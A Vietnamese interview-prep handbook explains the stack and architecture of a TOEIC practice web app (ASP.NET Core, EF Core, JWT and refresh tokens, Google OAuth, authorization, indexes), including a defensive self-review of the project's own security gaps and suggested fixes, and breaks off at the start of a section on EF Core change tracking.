# Cẩm nang công nghệ — TOEIC Master Pro

> **Mục đích tài liệu này:** hiểu công nghệ đủ sâu để **nói được** khi phỏng vấn.
> Mỗi mục đi theo cùng một khuôn: **khái niệm → keyword → áp dụng ở đâu trong dự án (`file:line`) →
> vì sao chọn → đánh đổi → câu hỏi phỏng vấn**.
>
> **Tài liệu song sinh:** [09-hien-trang-va-khuyen-nghi.md](09-hien-trang-va-khuyen-nghi.md) —
> hiện trạng, danh sách lỗi và hướng dẫn deploy thực chiến.
> Nói gọn: **cẩm nang = hiểu để nói · hiện trạng = làm để chạy.**
>
> **Quy ước:** ✅ có code thật · ⚠️ có nhưng chưa đủ · ⬜ chưa làm
>
> Cập nhật 2026-07-26, đối chiếu commit `d2d19f2` bằng một đợt audit 14 agent đọc song song
> toàn bộ codebase (92 phát hiện kỹ thuật, các khẳng định nghiêm trọng đã qua phản biện độc lập).

---

## Mục lục

| # | Phần | |
|---|---|---|
| 1 | [Stack thật của dự án](#1-stack-thật-của-dự-án) | ✅ |
| 2 | [Kiến trúc](#2-kiến-trúc) | ✅ |
| 3 | [Authentication](#3-authentication) | ✅ |
| 4 | [Authorization](#4-authorization) | ⚠️ |
| 5 | [Database & EF Core](#5-database--ef-core) | ✅ |
| 6 | [Hiệu năng EF Core](#6-hiệu-năng-ef-core) | ⚠️ |
| 7 | [Redis](#7-redis) | ⚠️ |
| 8 | [Hangfire](#8-hangfire) | ✅ |
| 9 | [Logging & xử lý lỗi](#9-logging--xử-lý-lỗi) | ✅ |
| 10 | [Bảo mật](#10-bảo-mật) | ⚠️ |
| 11 | [Frontend](#11-frontend) | ✅ |
| 12 | [Docker](#12-docker) | ⚠️ |
| 13 | [Deploy & CI/CD — khái niệm](#13-deploy--cicd--khái-niệm) | ⬜ |
| 14 | [Ngân hàng câu hỏi phỏng vấn](#14-ngân-hàng-câu-hỏi-phỏng-vấn) | — |

---

# 1. Stack thật của dự án

## Backend

| Lớp | Công nghệ | Trạng thái |
|---|---|---|
| Framework | ASP.NET Core 8 Web API | ✅ |
| Kiến trúc | Clean Architecture 4 tầng | ✅ |
| ORM | EF Core 8.0.11 + SQL Server 2022 | ✅ |
| Truy cập dữ liệu | `Repository<T>` + `UnitOfWork` tự viết | ✅ |
| Auth | ASP.NET Identity + JWT + Refresh Token + Google OAuth | ✅ |
| Background job | Hangfire 1.8.24 (lưu job vào SQL Server) | ✅ |
| Import Excel | EPPlus 7.6.1 | ✅ |
| Logging | Serilog (Console + File, xoay theo ngày) | ✅ |
| API Docs | Swagger + Scalar (chỉ Development) | ✅ |
| Rate limiting | `System.Threading.RateLimiting` built-in **(in-memory, không phải Redis)** | ⚠️ |
| Xử lý lỗi | `IExceptionHandler` + ProblemDetails | ✅ |
| Cache | Redis (StackExchange.Redis) — **đã dựng, chưa dùng** | ⚠️ |
| Email | `ConsoleEmailSender` — chỉ in ra console | ⚠️ |
| File storage | Lưu thẳng `wwwroot` trên đĩa | ⚠️ |
| Real-time | SignalR | ⬜ chưa cài |
| AI | Claude API | ⬜ chưa bắt đầu |

## Frontend

| Lớp | Công nghệ | Trạng thái |
|---|---|---|
| Build | Vite 8 | ✅ |
| Framework | React 19 + TypeScript 6 | ✅ |
| UI | shadcn/ui + Tailwind CSS 4 | ✅ |
| State | Zustand 5 + middleware `persist` | ✅ |
| Gọi API | Axios + interceptor gắn JWT | ✅ |
| Form | React Hook Form + Zod | ✅ |
| Routing | React Router 7 | ✅ |
| Audio / Chart / Rich text | Howler.js · Recharts · TipTap | ✅ |
| Server-state cache | TanStack Query | ⬜ **không dùng** |

## DevOps

| Item | Trạng thái |
|---|---|
| Docker Compose (SQL Server + Redis, môi trường dev) | ✅ |
| Dockerfile cho API / frontend | ⬜ chưa viết |
| CI/CD GitHub Actions | ⬜ `.github/workflows/` rỗng |
| Nginx · SSL · VPS | ⬜ chưa deploy |

> 💡 **Cách trả lời "kể về stack dự án em":** đừng đọc vẹt danh sách. Nói theo **vấn đề → giải pháp**:
> *"Web luyện thi TOEIC. Lõi là engine thi thử nên em cần chấm điểm chính xác theo bảng quy đổi ETS —
> phần đó em tách thành hàm thuần không phụ thuộc DB nên unit test được. Auth dùng Identity + JWT +
> refresh token vì user thi 2 tiếng liền, access token sống ngắn mà không được bắt họ đăng nhập lại.
> Nhắc lịch thi qua email thì phải chạy nền nên dùng Hangfire..."*

---

# 2. Kiến trúc

## 2.1 · Clean Architecture ✅

**Keyword: Dependency Rule** — mũi tên phụ thuộc chỉ đi từ ngoài vào trong.

| Tầng | Project | Chứa gì | Biết ai |
|---|---|---|---|
| **Domain** | `.Domain` | 12 entity, enum, `BaseEntity`, `Result` | Không ai |
| **Application** | `.Application` | 17 interface, DTO, `ToeicScoreHelper` | Domain |
| **Infrastructure** | `.Infrastructure` | EF Core, service thật, Redis, JWT | Domain + Application |
| **API** | `.API` | Controller, middleware, `Program.cs` | Tất cả |

**Keyword: Dependency Inversion** — tầng trong định nghĩa contract, tầng ngoài implement.
`ITestSessionService` (Application) nói **làm được gì**; `TestSessionService` (Infrastructure) nói
**làm thế nào**. Controller chỉ biết interface.

> **⚠️ Hai chỗ dự án lệch chuẩn — phải biết trước khi bị hỏi:**
>
> **(1) Business logic nằm ở Infrastructure, không phải Application.** Theo sách vở, nghiệp vụ nên ở
> Application/Domain còn Infrastructure chỉ lo kỹ thuật. Dự án đặt service ở Infrastructure vì service
> cần `IUnitOfWork`/EF Core trực tiếp. **Hệ quả thật:** đổi ORM là phải viết lại toàn bộ service.
>
> **(2) Domain là Anemic Model.** Entity chỉ có property `get; set;`, không factory method, không tự
> bảo vệ trạng thái. Ví dụ ai cũng gán được `session.Status = Completed` mà không qua kiểm tra.
>
> **Cách trả lời khi bị hỏi "Domain của em có business logic không?":**
> > *"Domain em hiện là anemic model — entity chỉ giữ dữ liệu, nghiệp vụ nằm ở Service. Em chọn vậy vì
> > phần lớn nghiệp vụ là điều phối nhiều entity cùng lúc: chấm một phiên thi phải đọc TestSession +
> > TestQuestion + Question + QuestionOption, đặt vào một entity đơn lẻ sẽ không tự nhiên. Đổi lại,
> > entity không tự bảo vệ được trạng thái. Nếu làm lại, chỗ đáng chuyển sang rich model nhất là
> > `TestSession` — cho nó method `Complete(score)` tự kiểm tra Status trước khi đổi."*
>
> Trả lời được như vậy = hiểu đánh đổi. Nói "Domain em chứa business logic" = **sai với code của chính mình**.

## 2.2 · Dependency Injection ✅

| Lifetime | Nghĩa | Dùng ở đâu |
|---|---|---|
| **Singleton** | 1 instance cho cả vòng đời app | `IConnectionMultiplexer` — [Program.cs:66](../backend/ToeicMasterPro.API/Program.cs#L66) |
| **Scoped** | 1 instance mỗi HTTP request | Mọi service + `DbContext` — Program.cs:62–99 |
| **Transient** | Mới mỗi lần inject | Không dùng |

**Vì sao Redis Singleton còn service Scoped?** `ConnectionMultiplexer` giữ sẵn pool kết nối TCP và tự
xử lý reconnect — tạo mới mỗi request là lãng phí khủng khiếp. Ngược lại `DbContext` có change tracking
nên **phải** hủy sau mỗi request, không thì dữ liệu request này lẫn sang request khác.

**Keyword: Captive Dependency** — inject Scoped vào Singleton là lỗi. Singleton sống mãi → giữ chặt
Scoped sống theo → `DbContext` không bao giờ được giải phóng. .NET ném lỗi lúc khởi động nếu phát hiện.

## 2.3 · Repository + Unit of Work ✅ — và cái giá của nó

[Repository.cs:25-26](../backend/ToeicMasterPro.Infrastructure/Persistence/Repositories/Repository.cs#L25):
```csharp
public async Task<IReadOnlyList<T>> FindAsync(Expression<Func<T,bool>> predicate, CancellationToken ct = default)
    => await _dbSet.Where(predicate).ToListAsync(ct);
```

`UnitOfWork.SaveChangesAsync()` gọi `_context.SaveChangesAsync()` — EF tự bọc mọi thay đổi đang chờ
vào **một transaction**. Nộp bài cập nhật 200 dòng answer + 1 dòng session: hoặc tất cả cùng thành công,
hoặc tất cả rollback. Không có chuyện lưu được nửa bài thi.

> **⭐ Câu bẫy kinh điển:** *"DbContext đã là Unit of Work, DbSet đã là Repository. Sao em bọc thêm?"*
>
> **Trả lời hai chiều — đây là câu đáng đầu tư nhất trong toàn bộ tài liệu này:**
>
> *Lợi:* service không phụ thuộc EF Core, dễ mock unit test, gom truy cập dữ liệu về một chỗ.
>
> *Giá phải trả — cụ thể trong dự án này:* `FindAsync` trả `IReadOnlyList<T>` tức **đã materialize**.
> Mọi thao tác sau đó (`Where`, `OrderBy`, `Skip`, `Take`, `GroupBy`, `Count`) chạy bằng
> **LINQ-to-Objects trên RAM của tiến trình API**, không dịch xuống SQL được. Hệ quả dây chuyền:
> - Mất `Include()` → phải query theo lô rồi ghép tay bằng `Dictionary`
> - Mất phân trang dưới SQL → `GetHistoryAsync` nạp **toàn bộ** phiên thi của user rồi mới `.Skip().Take()`
> - Mất `AsNoTracking()`, mất projection `Select()` xuống SQL
> - Đếm số câu mỗi đề bằng cách **nạp cả bảng `TestQuestions`** ([TestService.cs:35-38](../backend/ToeicMasterPro.Infrastructure/Services/TestService.cs#L35))
>
> *Điểm đáng nói thêm:* chính dự án đã **phá vỡ pattern khi cần** — `SrsService.cs:19` inject thẳng
> `ApplicationDbContext` thay vì đi qua Repository. Đó là dấu hiệu abstraction chưa đủ dùng.
>
> *Nếu làm lại:* cho `IRepository<T>` trả `IQueryable<T>`, hoặc thêm overload
> `FindAsync(predicate, orderBy, skip, take, selector)`, hoặc bỏ Repository và inject `DbContext`
> trực tiếp cho query phức tạp.

## 2.4 · Result Pattern ✅

[Result.cs](../backend/ToeicMasterPro.Domain/Common/Result.cs) — `IsSuccess` / `Value` / `Error`,
constructor private, chỉ tạo qua `Success()` / `Failure()`.

| | Exception | `Result<T>` |
|---|---|---|
| Chi phí | Đắt — .NET dựng stack trace | Gần như 0 |
| Chữ ký hàm | Nói dối — `Task<Dto>` trông như luôn thành công | Trung thực — bắt buộc kiểm tra `IsSuccess` |
| Dùng cho | **Sự cố** (mất kết nối DB) | **Kết quả nghiệp vụ** (đề chưa publish) |

Quy ước: lỗi nghiệp vụ → `Result.Failure` → Controller trả 400. Sự cố → exception bay lên →
`GlobalExceptionHandler` → 500.

> ⚠️ Hệ quả phụ hiện tại: **mọi lỗi nghiệp vụ đều trả 400**, kể cả "phiên thi không thuộc tài khoản này"
> (đáng lẽ 403) và "không tìm thấy phiên thi" (đáng lẽ 404). Xem [09](09-hien-trang-va-khuyen-nghi.md).

---

# 3. Authentication

> **Authentication = "anh là ai"**. Khác Authorization ở Phần 4.

## 3.1 · Password hashing ✅

[AuthService.cs:46](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L46):
```csharp
var createResult = await _userManager.CreateAsync(user, req.Password);   // tự hash
var passwordOk   = await _userManager.CheckPasswordAsync(user, req.Password);  // tự so
```

Dự án **không tự viết hàm băm**. Identity dùng `PasswordHasher<T>` mặc định:
**PBKDF2-HMAC-SHA256, 100.000 vòng lặp, salt 128-bit ngẫu nhiên, output 256-bit**, gói chung thành một
chuỗi Base64 lưu ở `AspNetUsers.PasswordHash` (byte đầu `0x01` = format IdentityV3).

| Keyword | Nghĩa |
|---|---|
| **Salt** | Chuỗi ngẫu nhiên trộn vào trước khi hash → hai user cùng mật khẩu vẫn ra hash khác → chặn **rainbow table** |
| **Lặp 100.000 vòng** | Làm chậm có chủ đích → brute-force tốn thời gian gấp trăm nghìn lần |
| **Timing attack** | `CheckPasswordAsync` so sánh bằng `CryptographicOperations.FixedTimeEquals` — thời gian so sánh không phụ thuộc vị trí byte sai |

**Chính sách mật khẩu** — [Program.cs:39-46](../backend/ToeicMasterPro.API/Program.cs#L39): tối thiểu
8 ký tự, có số, có chữ hoa, có ký tự đặc biệt, email duy nhất.

> **Đánh đổi đáng nói:** PBKDF2 là KDF thế hệ cũ, **dễ tăng tốc bằng GPU/ASIC**. Argon2id hoặc bcrypt
> kháng GPU tốt hơn. Muốn đổi thì implement `IPasswordHasher<ApplicationUser>` riêng — Identity vẫn
> verify được hash cũ nhờ marker byte nên migrate dần được.
>
> ⚠️ **Điểm yếu thật:** dự án dùng `CheckPasswordAsync` chứ không dùng
> `SignInManager.PasswordSignInAsync` → **mất toàn bộ cơ chế lockout** của Identity. Không có khóa
> tài khoản sau N lần sai. Chỉ còn rate limit theo IP chặn — đổi IP là brute-force thoải mái.

## 3.2 · JWT ✅

**Cấu trúc 3 phần:** `header.payload.signature`

⚠️ **Hiểu lầm nguy hiểm nhất:** header và payload chỉ **Base64-encode**, **không mã hóa**. Dán token
vào jwt.io là đọc được hết. Chữ ký **không giấu nội dung** — nó chỉ chứng minh nội dung chưa bị sửa.
**Không bao giờ để dữ liệu nhạy cảm trong payload.**

[TokenService.cs:24-33](../backend/ToeicMasterPro.Infrastructure/Authentication/TokenService.cs#L24):
```csharp
var claims = new List<Claim>{
    new (JwtRegisteredClaimNames.Sub,   user.Id.ToString()),
    new (JwtRegisteredClaimNames.Email, user.Email!),
    new (JwtRegisteredClaimNames.Jti,   Guid.NewGuid().ToString()),
    new ("fullname", user.FullName),
};
claims.AddRange(roles.Select(r => new Claim(ClaimTypes.Role, r)));
```

| Claim | Ý nghĩa |
|---|---|
| `sub` | ID người dùng — quan trọng nhất |
| `jti` | ID duy nhất của token, dùng để thu hồi từng token |
| `iss` / `aud` | Ai phát hành / dành cho hệ thống nào |
| `exp` | Hết hạn lúc nào |

**Keyword: HMAC-SHA256 — thuật toán ký đối xứng.** Cùng một khóa dùng để ký **và** verify.
Đối lập là **bất đối xứng (RS256)**: ký bằng private key, verify bằng public key.

> **Vì sao dự án chọn HS256:** chỉ có **một** API vừa phát hành vừa verify. Nếu tách nhiều microservice
> cùng verify thì phải chuyển RS256 — vì chia secret cho N service = **N chỗ có thể tự phát hành token
> Admin giả**.

**Verify** — [Program.cs:114-126](../backend/ToeicMasterPro.API/Program.cs#L114): bật đủ 4 cờ
`ValidateIssuer` / `ValidateAudience` / `ValidateLifetime` / `ValidateIssuerSigningKey`.

**Keyword: `ClockSkew = TimeSpan.Zero`** — mặc định .NET cho phép lệch **5 phút**, nghĩa là token hết
hạn vẫn dùng được thêm 5 phút. Đặt Zero khiến `exp` là tuyệt đối. Chi tiết này ít người biết → rất đáng nói.

> 🎯 **Điểm bất nhất trong chính codebase — rất dễ bị hỏi vặn:** JWT của hệ thống đặt `ClockSkew = 0`
> (nghiêm ngặt), nhưng luồng Google lại nới **5 phút**
> ([AuthService.cs:167-168](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L167)).
> Hai triết lý ngược nhau trong cùng một dự án. Biết trước để giải thích được: token Google đến từ
> máy khác nên phải khoan dung với lệch đồng hồ; token của mình thì mình kiểm soát cả hai đầu.

**Keyword: `MapInboundClaims = false`** ([Program.cs:113](../backend/ToeicMasterPro.API/Program.cs#L113)) —
mặc định .NET đổi tên claim ngắn (`sub`, `role`) thành URI dài kiểu WS-Federation. Tắt đi để giữ nguyên tên.

Đây là **mắt xích quyết định** `[Authorize(Roles = "Admin,ContentManager")]` có chạy không: bên phát
hành dùng hằng `ClaimTypes.Role`, bên verify đặt `RoleClaimType = ClaimTypes.Role` → **tên khớp nhau**.
Chỉ đổi một trong hai đầu là **mọi endpoint Admin trả 403 im lặng**.

## 3.3 · Refresh Token ✅

**Vấn đề:** access token nên sống ngắn (lộ thì thiệt hại ít) nhưng sống ngắn thì user phải đăng nhập
lại liên tục — không chấp nhận được khi đang thi 2 tiếng.

| | Access Token | Refresh Token |
|---|---|---|
| Là gì | JWT có chữ ký | Chuỗi ngẫu nhiên 64 byte |
| Lưu ở đâu | Client giữ, **server không lưu** | **Lưu DB** bảng `RefreshTokens` |
| Thu hồi được | ❌ Không | ✅ Có |

[TokenService.cs:60-65](../backend/ToeicMasterPro.Infrastructure/Authentication/TokenService.cs#L60):
```csharp
Token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(64)),
```

**Keyword: CSPRNG.** `RandomNumberGenerator` là bộ sinh ngẫu nhiên **an toàn mật mã**. Khác `Random`
thông thường ở chỗ `Random` **đoán trước được** nếu biết seed. Với token bảo mật bắt buộc dùng CSPRNG.

**Keyword: Token Rotation** ([AuthService.cs:79-85](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L79)) —
mỗi lần refresh: thu hồi token cũ (`RevokedAt = UtcNow`), cấp cặp mới. Mỗi refresh token dùng **đúng một lần**.

**Bulk revoke khi đổi mật khẩu** ([AuthService.cs:142-149](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L142)) —
đá mọi thiết bị khác ra. Hành vi đúng: tài khoản bị chiếm thì đổi mật khẩu phải đuổi được kẻ gian.

> ⚠️ **Ba điểm còn thiếu — nên chủ động nói ra:**
> 1. **Không có reuse detection.** Token đã thu hồi mà dùng lại thì chỉ bị từ chối lặng lẽ. Đúng chuẩn
>    phải thu hồi **cả họ** token của user đó, vì chắc chắn có kẻ đang dùng token trộm.
> 2. **Token lưu plaintext trong DB.** Lộ DB là chiếm được mọi phiên. Chuẩn hơn là lưu SHA-256 của token.
> 3. **Access token không thể vô hiệu hóa.** `jti` được sinh nhưng không lưu, không blacklist. Đổi mật
>    khẩu chỉ revoke refresh token — access token cũ vẫn sống tới khi hết hạn.

## 3.4 · Google OAuth 2.0 ✅

```
1. FE bấm "Đăng nhập với Google" (@react-oauth/google)
2. Google trả FE một idToken (JWT do Google ký)
3. FE gửi lên POST /api/auth/google-login
4. Backend GoogleJsonWebSignature.ValidateAsync → kiểm chữ ký Google + claim `aud`
5. Tìm user theo email; chưa có thì tạo, gán role "User", EmailConfirmed = true
6. Cấp JWT CỦA HỆ THỐNG MÌNH (không dùng token Google cho request sau)
```

**Keyword: `aud` (audience) — bước quan trọng nhất.**
[AuthService.cs:163-170](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L163):
```csharp
Audience = new[] { _googleSettings.ClientId },
```

> **Vì sao phải kiểm `aud`?** Google cấp idToken cho **hàng triệu ứng dụng**. Không kiểm `aud` thì kẻ
> tấn công lấy một idToken hợp lệ Google cấp cho **app khác của họ** rồi gửi vào API của bạn — chữ ký
> vẫn đúng (Google ký mà) và bạn cho họ đăng nhập. Đây là lỗ hổng OAuth kinh điển.

> ⚠️ **Điểm yếu thật — pre-hijack account takeover.** Google login gộp tài khoản **chỉ bằng email**
> ([AuthService.cs:178](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L178)), không
> lưu Google `sub`, không kiểm `EmailVerified`. Kết hợp với việc **login không kiểm `EmailConfirmed`**,
> kịch bản tấn công là: kẻ gian đăng ký trước bằng email nạn nhân → sau này nạn nhân bấm "Đăng nhập với
> Google" → được cấp token vào **đúng tài khoản kẻ gian đã tạo**, trong khi kẻ gian vẫn giữ mật khẩu.
>
> Chỉ áp dụng cho tài khoản **chưa tồn tại**, không chiếm được tài khoản có sẵn. Cách sửa: dùng
> `AspNetUserLogins` + Google `sub` làm khóa liên kết thay vì email.

## 3.5 · Chống user enumeration ✅ (một phần)

[AuthService.cs:116-127](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L116) —
`ForgotPassword` **luôn trả Success** dù email không tồn tại. `Login` trả cùng một câu cho sai email
và sai mật khẩu.

**Keyword: User Enumeration.** Nếu API trả "email không tồn tại", kẻ tấn công script thử hàng triệu
email để lập danh sách tài khoản thật, rồi brute-force hoặc lừa đảo.

> ⚠️ **Không nhất quán:** `Register` trả thẳng *"Email đã được sử dụng"*
> ([AuthService.cs:37](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L37)) →
> vẫn dò được. Chủ ý đúng ở một chỗ nhưng chưa áp dụng toàn bộ.

---

# 4. Authorization

> **Authorization = "anh được làm gì"**. Chạy **sau** Authentication.

## 4.1 · Role-based ✅ (phía API)

3 role seed lúc khởi động ([Program.cs:238-247](../backend/ToeicMasterPro.API/Program.cs#L238)):
`Admin`, `ContentManager`, `User`. Role đi vào token mỗi lần cấp phát, nên **không cần query DB** ở mỗi request.

```csharp
[Authorize]                                   // chỉ cần đăng nhập
[Authorize(Roles = "ContentManager,Admin")]   // phải có một trong hai
```

**Đọc danh tính** — [CurrentUserService.cs:24-26](../backend/ToeicMasterPro.API/Services/CurrentUserService.cs#L24):
```csharp
var id = User?.FindFirstValue(ClaimTypes.NameIdentifier) ?? User?.FindFirstValue("sub");
```

> **Nguyên tắc vàng:** danh tính **luôn lấy từ token**, không bao giờ từ body request. Nếu Controller
> nhận `userId` từ body thì user A sửa body thành id của user B là xong.

## 4.2 · Ownership check — quan trọng hơn role ✅

Role chỉ trả lời "có phải Admin không". Còn "phiên thi này có phải của tôi không" thì role không giúp.
[TestSessionService.cs:84-85](../backend/ToeicMasterPro.Infrastructure/Services/TestSessionService.cs#L84):
```csharp
if (session.UserId != userId)
    return Result<...>.Failure("Phiên thi không thuộc tài khoản này.");
```

**Keyword: IDOR (Insecure Direct Object Reference)** / **BOLA (Broken Object Level Authorization)** —
đoán được id của người khác là xem được dữ liệu của họ. Đây là lỗ hổng API phổ biến nhất
(OWASP API1:2023). Dự án chặn đúng ở luồng phiên thi.

## 4.3 · ✅ Lỗ hổng nghiêm trọng nhất — ĐÃ VÁ 2026-08-04

**Trước:** không có fallback authorization policy → endpoint nào quên `[Authorize]` là public hoàn
toàn. Và đã có endpoint quên thật: `GET /api/Question` trả về đáp án đúng cho người ẩn danh.

**Sau:** `Program.cs:134-137` đặt fallback policy `RequireAuthenticatedUser`. Chi tiết chuỗi khai thác
ở [09 — mục 1.1](09-hien-trang-va-khuyen-nghi.md) · bảng phân quyền ở
[10-phan-quyen-endpoint.md](10-phan-quyen-endpoint.md).

> ### 🎯 Ba thứ phải nói được khi kể chuyện này
>
> **1. `FallbackPolicy` khác `DefaultPolicy`** — nhầm là đặt sai chỗ, không có tác dụng:
>
> | | Áp dụng khi |
> |---|---|
> | `DefaultPolicy` | Endpoint **CÓ** `[Authorize]` nhưng không ghi rõ policy/role |
> | `FallbackPolicy` | Endpoint **KHÔNG CÓ** metadata authorization nào. Mặc định `null` = cho qua hết |
>
> **Suy ra:** khi fallback đã là `RequireAuthenticatedUser`, viết `[Authorize]` **trần** là **vô
> nghĩa** — trùng đúng policy đó. Muốn siết phải ghi `Roles`. (Đã mắc đúng lỗi này lúc sửa.)
>
> **2. Authorization không áp dụng cho middleware terminal.** `UseStaticFiles` và
> `UseHangfireDashboard` tự trả response rồi dừng, không chạm `UseAuthorization`. Fallback policy
> **không** bảo vệ được hai chỗ đó — vẫn phải xử lý riêng (Day 41).
>
> **3. Đọc response biết bị chặn ở đâu:** `403` + `Content-Length: 0` = chặn ở middleware ·
> `400` + body nghiệp vụ = **đã đi qua** authorization vào tới service. Đây là cách phát hiện ra
> `[Authorize]` trần không có tác dụng.

**Keyword: Secure by default.** Cấu hình đúng là **mặc định chặn**, chỗ nào muốn mở thì đánh dấu
`[AllowAnonymous]` tường minh:
```csharp
builder.Services.AddAuthorizationBuilder()
    .SetFallbackPolicy(new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build());
```
Một dòng này biến "quên `[Authorize]` = lộ dữ liệu" thành "quên `[AllowAnonymous]` = 401" — hỏng an
toàn thay vì hỏng nguy hiểm. **Đây là câu trả lời rất mạnh cho câu hỏi "em thiết kế bảo mật thế nào".**

## 4.4 · ⚠️ Frontend không biết role

`User` type không có `roles`, backend không trả roles, `ProtectedRoute` chỉ kiểm đăng nhập.
Hệ quả: user thường vẫn thấy menu "Quản lý đề thi", bấm vào → 403.

> **Nguyên tắc phải nhớ:** ẩn menu là **giấu**, chặn route là **khóa**, nhưng **cả hai chỉ là UX**.
> Bảo mật thật luôn ở server. Frontend chạy trên máy người dùng — họ sửa được tất cả.
> **Không bao giờ tin frontend.**

---

# 5. Database & EF Core

## 5.1 · DbContext ✅

[ApplicationDbContext.cs](../backend/ToeicMasterPro.Infrastructure/Persistence/ApplicationDbContext.cs):
```csharp
public class ApplicationDbContext
    : IdentityDbContext<ApplicationUser, IdentityRole<Guid>, Guid>, IApplicationDbContext
{
    protected override void OnModelCreating(ModelBuilder builder)
    {
        base.OnModelCreating(builder);   // BẮT BUỘC — để Identity tạo bảng của nó
        builder.ApplyConfigurationsFromAssembly(typeof(ApplicationDbContext).Assembly);
    }
}
```

**Keyword: Fluent API vs Data Annotation.** Data Annotation gắn attribute lên entity → làm bẩn Domain
bằng thứ của EF Core. Fluent API viết trong class config riêng → **Domain sạch**. Dự án dùng Fluent API —
đúng với Clean Architecture.

**Keyword: `ApplyConfigurationsFromAssembly`** — tự quét mọi `IEntityTypeConfiguration<T>`, khỏi khai
báo từng cái.

## 5.2 · Các kỹ thuật cấu hình đang dùng ✅

| Kỹ thuật | Ở đâu | Giải quyết gì |
|---|---|---|
| **Value Converter + ValueComparer** | `QuestionConfiguration.cs:28-36` | `Question.Tags` là `List<string>` trong C# nhưng lưu DB dạng chuỗi. `ValueComparer` bắt buộc phải có — thiếu nó change tracker không phát hiện được thay đổi trong list |
| **Delete Behavior** | `TestQuestionConfiguration.cs:22-30` | `Cascade` = xóa cha thì xóa con. `Restrict` = chặn xóa nếu còn con. Dùng `Restrict` cho `Question` để không mất lịch sử thi |
| **Composite Unique Index** | `TestSessionAnswerConfiguration.cs:20` | `(SessionId, QuestionId)` UNIQUE — một câu chỉ được lưu một đáp án trong một phiên. Chính index này **biến race condition thành lỗi 500 thay vì dữ liệu bẩn** |
| **`HasConversion<int>()`** | `QuestionConfiguration.cs:24-25` | Enum lưu dạng `int` — gọn, nhưng đổi thứ tự enum là hỏng dữ liệu cũ |
| **`HasDefaultValue`** | `TestConfiguration.cs:20` | Giá trị mặc định do **DB** đặt, không phải C# |
| **Guid client-generated key** | `BaseEntity.cs:3-10` | `Id = Guid.NewGuid()` sinh ở C#. Biết id trước khi insert nên ghép quan hệ dễ; đổi lại Guid ngẫu nhiên gây **phân mảnh clustered index** — production nên dùng sequential GUID |

## 5.3 · Index — 29 index đang tồn tại ✅

> 🔴 **Đính chính bản trước của tài liệu này:** phiên bản cũ khuyên "thêm index cho
> `RefreshTokens.Token`, `TestSessions(UserId,Status)`, `TestSessionAnswers.SessionId`".
> **Cả ba đều ĐÃ TỒN TẠI.** Lời khuyên đó sai và đã bị gỡ.

**Do Fluent API (21):** `AspNetUsers(Email)`, `AspNetUsers(Plan)`, `Questions(Part)`,
`Questions(Difficulty)`, `Questions(IsPublished)`, `Tests(Series)`, `Tests(IsPublished)`,
`Tests(CreatedByUserId)`, `TestQuestions(TestId,QuestionId)` UNIQUE, `TestSessions(UserId,Status)`,
`TestSessions(CompletedAt)`, `TestSessionAnswers(SessionId,QuestionId)` UNIQUE,
`Vocabularies(Word)` UNIQUE, `Vocabularies(Topic)`, `UserVocabularies(UserId,VocabularyId)` UNIQUE,
`UserVocabularies(UserId,NextReviewDate)`, `ExamSchedules(City,ExamDate)`, `ExamSchedules(IsActive)`,
`UserExamReminders(UserId,ExamScheduleId)` UNIQUE, `UserExamReminders(EmailSent,UserId)`,
`RefreshTokens(Token)` UNIQUE.

**Do EF tự sinh cho FK (8)** + **7 index built-in của Identity**.

**Keyword: Composite Index — thứ tự cột quan trọng.** Index `(UserId, Status)` dùng được khi lọc theo
`UserId`, hoặc cả hai — **nhưng không dùng được nếu chỉ lọc `Status`**. Quy tắc: cột lọc nhiều nhất,
chọn lọc cao nhất đặt trước.

> **Nhận xét đáng nói khi phỏng vấn:** dự án **thừa** index chứ không thiếu. Nhiều index đánh trên cột
> bit/enum **độ chọn lọc thấp** (`IsPublished`, `IsActive`, `Plan`, `Difficulty`) — SQL Server hầu như
> không dùng nonclustered index không covering trên cột bit, nên chúng **chỉ tốn chi phí ghi**.
>
> **Điểm nghẽn thật của dự án không phải index** mà là nạp quá nhiều dòng về RAM rồi xử lý bằng LINQ.
> Thứ đáng thêm là **covering index (INCLUDE column)** cho query thống kê, không phải index mới.

**Keyword: sargable.** Query dùng hàm trên cột thì **không dùng được index**. Dự án có 2 chỗ:
`VocabularyService.cs:20-22` dùng `.ToLower()` → vô hiệu hóa `IX_Vocabularies_Word`;
`ExamScheduleService.cs:19-25` lọc theo tháng/năm bằng hàm trên cột `ExamDate`.

## 5.4 · Migrations ✅

```bash
dotnet ef migrations add TenMigration \
  --project backend/ToeicMasterPro.Infrastructure \
  --startup-project backend/ToeicMasterPro.API

dotnet ef database update --project ... --startup-project ...
```

Migration nằm ở `Infrastructure/Migrations/` (**không phải** `Persistence/Migrations/`).

**Vì sao cần `--startup-project`?** Migration ở Infrastructure nhưng connection string ở
`appsettings.json` của API. EF cần cả hai. Dự án còn có
`ApplicationDbContextFactory` (`IDesignTimeDbContextFactory`) để `dotnet ef` dựng được DbContext lúc
design-time mà không phải chạy cả app.

**Keyword: `__EFMigrationsHistory`** — bảng EF tự tạo ghi migration đã chạy.

> **Câu hỏi phỏng vấn: "Production chạy migration thế nào?"** Ba cách:
> 1. `Database.Migrate()` lúc khởi động — tiện nhưng nguy hiểm khi chạy nhiều instance (cùng migrate → hỏng)
> 2. Sinh SQL script (`dotnet ef migrations script`) rồi review và chạy tay — an toàn nhất
> 3. Chạy trong bước CI/CD trước khi deploy code — cân bằng nhất
>
> Dự án hiện chạy tay và **không có** `Database.Migrate()` lúc khởi động → DB chưa migrate thì app crash.

---

# 6. Hiệu năng EF Core

> Phần này nhiều keyword nhất và cũng là chỗ dự án yếu nhất — nên nắm kỹ.
> Nguyên tắc trước hết: **đo trước, tối ưu sau**. Nói được câu này đã là điểm cộng.

## 6.1 · Change Tracking & `AsNoTracking()` ⚠️

**Keyword: Change Tracking.** EF nhớ **trạng thái gốc** của mọi entity nạp ra: tạo `EntityEntry`,
chụp **snapshot toàn bộ property**, giữ **identity map**. Khi `SaveChanges`, nó so sánh
(`DetectChanges`) để biết cột nào đổi.

